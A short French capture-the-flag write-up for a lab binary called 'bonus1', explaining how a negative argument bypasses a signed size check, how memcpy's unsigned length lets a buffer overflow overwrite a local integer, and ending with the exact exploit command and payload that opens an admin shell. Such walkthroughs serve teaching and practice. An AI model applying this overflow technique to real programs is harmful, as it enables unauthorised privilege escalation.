bonus1:
Il y a une seule fonction main qui prend deux arguments. Le premier argument est atoi pour être assigné à un int (i). Pour accéder au shell admin, il faut que i soit d'abord < 10, puis == 0x574f4c46 (1464814662 en décimal).

Après le premier check, un memcpy est utilisé, avec le nombre de byte copié = i * 4 (il est très important de noter que i est converti en uint par memcpy). On peut alors utiliser un overflow pour réécrire i et passer le second check, puisque i est à l'adresse 0x3c(%esp) et le buffer est à l'adresse 0x14(%esp).

A noter qu'il faudra que i soit assez grand pour allouer 44 caractères (0x3c - 0x14 = 0x28, 40 en décimal + 4 charactères qui équivalent 0x574f4c46)
```
0x08048464 <+64>:    lea    0x14(%esp),%eax
0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
```
On peut utiliser un nombre négatif pour bypass le premier check. Si on mets par exemple
```
i = atoi("-10");
// valeur "réelle" de i
printf("%i\n", i * 4); // = -40
// valeur de i converti en unsigned
printf("%u\n", i * 4); // = 4294967256
```

4294967256 est bien au-delà de la limite max d'un int (2147483647) et le programme segfault. Il faut descendre dans les chiffres négatifs jusqu'à avoir un bon nombre.
Si on essaie directement la valeur négative max on obtient
```
i = atoi("-2147483648");
printf("%i\n", i * 4); //= 0
printf("%u\n", i * 4); //= 0
```

On peut remonter un peu : -2147483628

```
i = atoi("-2147483628");
printf("%i\n", i * 4); //= 80
printf("%u\n", i * 4); //= 80
```

Il nous reste juste à ajouter la valeur en little endian pour passer le check.

On peut donc ouvrir un shell admin avec cette commande:

`./bonus1 -2147483628 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')`
